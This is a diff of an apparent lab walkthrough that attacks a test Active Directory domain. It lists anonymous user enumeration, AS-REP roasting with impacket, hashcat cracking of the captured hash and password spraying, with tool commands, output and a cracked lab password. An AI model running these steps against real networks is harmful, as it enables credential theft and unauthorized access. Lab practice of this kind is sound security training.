@@ -9,7 +9,7 @@ tags :  AD, Lab, cme, enum4linux
 
 ### With CME
 
-```
+```bash
 cme smb 192.168.56.11 --users
 ```
 
@@ -26,7 +26,7 @@ we could also retreive the password policy before trying bruteforce
 
 - We can confirm the anonymous listing on the NORTH DC also with Enum4linux :
 
-```
+```bash
 enum4linux 192.168.56.11
 ```
 
@@ -47,8 +47,11 @@ enum4linux 192.168.56.11
 
 - The anonymous listing is done with Remote Procedure Call on winterfell (192.168.56.11), so we could also do this with rpcclient directly.
 
+```bash
+rpcclient -U "NORTH\\" 192.168.56.11 -N
 ```
-# rpcclient -U "NORTH\\" 192.168.56.11 -N
+
+```
 rpcclient $> enumdomusers
 user:[Guest] rid:[0x1f5]
 user:[arya.stark] rid:[0x456]
@@ -77,8 +80,11 @@ group:[Mormont] rid:[0x454]
 
 - Get all domain users:
 
-```
+```bash
 net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
+```
+
+```
 NORTH\Administrator
 NORTH\vagrant
 NORTH\krbtgt
@@ -122,10 +128,12 @@ Administrator
 
 - We now could try asreproasting on all the users with impacket:
 
+```bash
+GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
 ```
-# GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt      
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -146,8 +154,11 @@ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b71bebe8d2955599a76ccf4a4
 
 - We get a ticket for brandon.stark and we will try to break it as the user don't require kerberos preauthentication
 
+```bash
+hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
 ```
-# hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
+
+```
 ...
 Dictionary cache built:
 * Filename..: /usr/share/wordlists/rockyou.txt
@@ -188,7 +199,7 @@ Hardware.Mon.#1..: Temp: 78c Util: 80%
 
 - We could try the classic user=password test 
 
-```
+```bash
 cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
 ```
 
@@ -196,7 +207,7 @@ cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
 
 - We also could use sprayhound (https://github.com/Hackndo/sprayhound)
 
-```
+```bash
 sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
 ```
 
@@ -204,13 +215,13 @@ sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
 
 - We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)
 
-```
+```bash
 sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
 ```
 
 - See the status of bruteforce
 
-```
+```bash
 cme smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
 ```
 
